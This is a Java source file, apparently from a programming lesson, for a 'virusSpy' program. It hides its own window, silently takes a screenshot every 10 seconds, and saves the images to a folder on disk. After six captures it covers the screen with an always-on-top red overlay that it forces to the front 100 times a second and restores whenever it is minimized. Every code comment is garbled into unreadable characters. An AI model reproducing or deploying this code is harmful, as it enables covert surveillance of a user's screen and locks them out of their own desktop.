package ru.shishkin.javaLessonFromComputer12.virusSpy;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.image.BufferedImage;
import java.io.File;

class FrameVS extends JFrame
{
    // ���������� ���� Robot
    private Robot rob;
    // ���������� ���� ������
    private Timer tm;
    // ������� ����������
    private int kol=0;
    // ���� ��� ����������
    private Frame wnd;

    // ����������� ������
    public FrameVS()
    {
        try
        {
            // ������� ����� ������ ������ Robot
            rob = new Robot();
        }
        catch (Exception e) {}

        // ������� ������ � ��������� � 10 ������
        tm = new Timer(10000,new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                // ������� �������� ������ � ���������� ��� � ����
                saveScreen();
            }
        });
        // ��������� ������
        tm.start();

        // �� ��������� ������ ���������� ��� �������� ����
        setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
        // ������� ����
        setVisible(true);
        // � ����� ��� ������
        setVisible(false);
    }

    // ����� ������ ��������� ������ � ���������� ��� � ����
    private void saveScreen()
    {
        // ������� ���������� ����������
        kol++;

        // ���������� ������� ���������� ������
        Dimension dm = Toolkit.getDefaultToolkit().getScreenSize();
        int w = dm.width;
        int h = dm.height;

        try
        {
            // ������� �������� ������ � ������� ������ Robot
            BufferedImage img =
                    rob.createScreenCapture(new Rectangle(0,0,w,h));
            // ��������� ����������� � PNG �����
            ImageIO.write(img, "PNG", new File("c:\\mobile\\img"+kol+".png"));
        }
        catch (Exception e) {}

        // ����� ������ ���� ������
        if (kol==6)
        {
            // ������ �������������
            tm.stop();

            // ������� ����
            wnd = new Frame();
            // ��������� ����������� ��������� �������� ����
            wnd.setResizable(false);
            // ������������� ������� � ������ �����
            wnd.setBounds(0, 0, w, h);
            // ������������� ���� ���� �������
            wnd.setBackground(Color.RED);
            // ��������� ���� ������ ������ ����
            wnd.setAlwaysOnTop(true);
            // ������� ����� ����
            wnd.setUndecorated(true);
            // ������ ������������ 50%
            wnd.setOpacity(0.5f);

            // ���������� ���������� �������
            wnd.addWindowListener(new WindowAdapter() {
                // ��� ������������ ����
                public void windowIconified(WindowEvent arg0) {
                    // ��������� ���� �� ������ �����
                    wnd.setExtendedState(Frame.MAXIMIZED_BOTH);
                }
            });

            // ������� ����
            wnd.setVisible(true);

            // ������� ������ � ��������� � 10 ����������� (100 ��� � �������)
            tm = new Timer(10,new ActionListener() {
                public void actionPerformed(ActionEvent e) {
                    // ������� ���� �� �������� ����
                    wnd.toFront();
                }
            });
            // ��������� ������
            tm.start();

        }
    }
}